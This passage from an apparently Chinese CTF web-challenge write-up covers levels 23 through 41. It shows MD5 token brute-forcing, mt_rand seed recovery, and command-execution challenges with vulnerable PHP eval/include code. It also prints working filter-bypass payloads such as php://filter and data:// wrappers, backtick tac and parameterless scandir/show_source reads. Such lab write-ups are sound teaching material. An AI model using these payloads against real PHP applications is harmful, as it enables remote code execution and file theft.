class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;加密后的md5值为：&quot;</span>.$token).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;解密后的值为：&quot;</span>.$dict[$i].$dict[$j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>python版本脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/2 11:58</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b = (str(i) + str(j)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]):</span><br><span class="line">            <span class="keyword">if</span> ((int(m[<span class="number">1</span>:<span class="number">2</span>]) + int(m[<span class="number">14</span>:<span class="number">15</span>]) + int(m[<span class="number">17</span>:<span class="number">18</span>])) / int(m[<span class="number">1</span>:<span class="number">2</span>])) == int(m[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                print(b)</span><br></pre></td></tr></table></figure>
<p>运行后得到满足的值，即3j<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/1%40X%282I%7D%29WT%40%7DX%7B%7BC%7B%7DW%5BYO3.png" alt=""><br>
于是构造url传参token=3j，获得flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/%7DMZ8I%5BI%5BR%2441YZ%29P0%5DA8TU9.png" alt=""></p>
<h3 id="web24"><a class="header-anchor" href="#web24">¶</a>web24</h3>
<p>审计代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现其实这是伪随机数，因为mt_srang已经固定了，我们写个代码运行一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line">$result = intval(mt_rand());</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/7%28XX9%5BUBRX8TG%60%5BP4F8M%29%5BA.png" alt=""><br>
得到1155388967，所以构成?r=1155388967即可获得flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/N9%294NSPFPC1BUE%28KK%24%7B7Q7R.png" alt=""></p>
<h3 id="web25"><a class="header-anchor" href="#web25">¶</a>web25</h3>
<p>首先审计代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这次种子没有给出，但发现一个关键地方，就是我们可以把传入的r设置为0，即?r=0，可以输出$rand的值，此时$rand=mt_rand()的值，也就是随机数的值<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/NM0%607T~RI%28QV7UQDCA%5B5%7DQT.png" alt=""><br>
获得随机数为86715576，这个时候我们使用逆推工具尝试逆推出种子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具地址：https:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br><span class="line"></span><br><span class="line">git下载方式：git clone https:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br><span class="line">下载后命令行输入make然后回车编译出php_mt_seed文件</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_0%286QB7%245ME%24XVJ%5B2P8HMT0.png" alt=""><br>
得到种子为4188754181，因为$_COOKIE[‘token’]的值要等于两个随机数相加，于是我们写个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">4188754181</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$result = mt_rand()+mt_rand();</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/LH_7%246BHAF3_G2K%24SH7_240.png" alt=""><br>
得到token的值为2504830688</p>
<blockquote>
<p>所以开始构造<br>
第一个，构造?r=86715576，使得$rang=0，满足if((!$rand))，进入下一层if判断token的值<br>
第二个，构造cookie头里的token=2504830688</p>
</blockquote>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_LWI%60Z57MJJ6T~63%25%28%29F4Z5.png" alt=""><br>
成功拿到flag</p>
<h3 id="web26"><a class="header-anchor" href="#web26">¶</a>web26</h3>
<p>打开页面，看到一个网站<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/1XQD%5DP2%29%60E%24E61~M4R5D%25%5BT.png" alt=""><br>
右键查看源码，发现存在一个checkdb.php<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/P%7BD~2I33%245_RB%25ZPCX8%60L%60E.png" alt=""><br>
照这个格式post发送数据，得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/V0HXO4ABATGZ%7DPSLWUN969R.png" alt=""></p>
<h3 id="web27"><a class="header-anchor" href="#web27">¶</a>web27</h3>
<p>打开依然是一个cms<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/BP6EY%25%258HNQ%25QSL_HNCTKGH.png" alt=""><br>
点击录取名单，下载得到一份名单<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/813HRBR%251X85L42%28FAI%298N3.png" alt=""><br>
发现身份证中间少了日期，继续回到页面，点击查询系统<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/AKL~%60%24QE%7DN%28F9E12TH%28IF03.png" alt=""><br>
需要输入姓名和身份证，我们现在有了姓名，身份证模糊，那进行抓包爆破<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/L%7D%28%25%40L7MXJ%40%60L%60ZE6ELV7OC.png" alt=""><br>
设置一下爆破身份证中的日期<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/3328122SZ%5DDZ1A%283D9T1%290S.png" alt=""><br>
爆破结果<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/9STH6184%7DTQ%60%5DJTBMYXLM%40R.png" alt=""><br>
解码一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/J%5D4371%5D%28~B5%29O4%5D%4070%5B%28V%7BH.png" alt=""><br>
得到身份证号和学号，然后去首页登录一下，得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/HP%7B%29%24%246%28%29%40%5D80BW%7B%25BRO%5DFC.png" alt=""></p>
<h3 id="web28"><a class="header-anchor" href="#web28">¶</a>web28</h3>
<p>打开页面，没发现什么有用的信息，但是观察到url有些奇怪<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/R%7DN~3OR%24%29AYK3ZR%40KE_%28Z%24Y.png" alt=""><br>
应该是爆破目录，抓包一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/L%7BZ%25%5BNXER14_RH%7DI~K7I%40EP.png" alt=""><br>
两个payload都选择0到100进行爆破<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/F%28_C2B6B%60Q%24%25N~8VF%7BCZ~%258.png" alt=""><br>
在爆破结果中得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/%5D3HMWR%29%7B%60I%60V8~D~987Z5WS.png" alt=""></p>
<h2 id="命令执行-29-77-118-122-124"><a class="header-anchor" href="#命令执行-29-77-118-122-124">¶</a>命令执行(29-77&amp;118-122&amp;124)</h2>
<h3 id="web29"><a class="header-anchor" href="#web29">¶</a>web29</h3>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先先system(“ls”);查看一下文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/K%24S4PZ%5BAUUD6HI4V3BU%24%5BAW.png" alt=""><br>
既然过滤了flag，那我们就fla*的形式进行匹配，结合tac命令输出flag.php文件内容<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/PSF%24%29E%25DF_X2Q5%7DKHS%60%7DEVR.png" alt=""></p>
<h3 id="web30"><a class="header-anchor" href="#web30">¶</a>web30</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里把system命令给过滤了，不过有别的姿势，例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac *&#96;;</span><br></pre></td></tr></table></figure>
<p>还是使用通配符进行匹配，不过换了echo进行输出<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/DY%28YYO%60%7DR_2%293%60MF2J%400A51.png" alt=""></p>
<h3 id="web31"><a class="header-anchor" href="#web31">¶</a>web31</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里开始过滤了空格，本来我是使用%20编码绕过的不知道为什么不行(有点疑惑)，然后就改用了%09</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo%09&#96;tac%09*&#96;;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/MPL%7BFEDQ%40VS%28C%5DK%24%60IZPGX3.png" alt=""></p>
<h3 id="web32"><a class="header-anchor" href="#web32">¶</a>web32</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把反引号和echo都过滤了，不过还有新姿势，利用include函数(还有require也可以)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""><br>
把base64解码后即可得到flag</p>
<h3 id="web33"><a class="header-anchor" href="#web33">¶</a>web33</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次多过滤了双引号，继续使用上一题的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web34"><a class="header-anchor" href="#web34">¶</a>web34</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤一个:号，还是可以使用上一题的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web35"><a class="header-anchor" href="#web35">¶</a>web35</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤一个&lt;号和一个=号，不过没有影响，继续使用前面的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web36"><a class="header-anchor" href="#web36">¶</a>web36</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web37"><a class="header-anchor" href="#web37">¶</a>web37</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>换新题了，这次是使用了include语句，这里过滤了flag，我们采用伪协议data的方法进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/%5DJ0%28I6%7BNZRUAD3WLGORLO%604.png" alt=""></p>
<h3 id="web38"><a class="header-anchor" href="#web38">¶</a>web38</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次在前面基础上过滤了php和file，对我们无碍，因为我们使用的是php短标签，所以继续使用上面的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web39"><a class="header-anchor" href="#web39">¶</a>web39</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次减少了过滤，但是会再后面加上.php的后缀，然而我们前面的payload结尾是有一个?&gt;进行了标签闭合，所以?&gt;.php没有影响，继续使用前面payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web40"><a class="header-anchor" href="#web40">¶</a>web40</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里回到eval语句执行命令，但过滤了许多东西，没有过滤掉英文的()，那我们使用无参数的rce进行构造读取文件</p>
<blockquote>
<p>print_r(scandir(‘.’));      查看当前目录下的所有文件名</p>
<p>localeconv() 				函数返回一包含本地数字及货币格式信息的数组。</p>
<p>current() 					  函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</p>
</blockquote>
<p>我们先打印出当前目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/NHDM7A4%5BNQ%5BU3%25S%401W%60%24R2P.png" alt=""><br>
读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
<blockquote>
<p>each()        返回数组中当前的键/值对并将数组指针向前移动一步<br>
end()          将数组的内部指针指向最后一个单元<br>
next()         将数组中的内部指针向前移动一位<br>
prev()         将数组中的内部指针倒回一位<br>
array_reverse() 	以相反的元素顺序返回数组</p>
</blockquote>
<p>需要知识点齐了，观察flag.php在倒数第二位，我们开始构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/AKO6S7Q%24R_EJ%5B6Q13BEICQ9.png" alt=""></p>
<h3 id="web41"><a class="header-anchor" href="#web41">¶</a>web41</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了数字和字母还有一些其他符号，但我们可以利用或运算符进行构造payload进行命令执行<br>
思路：</p>
<blockquote>
<p>通俗解释：<br>
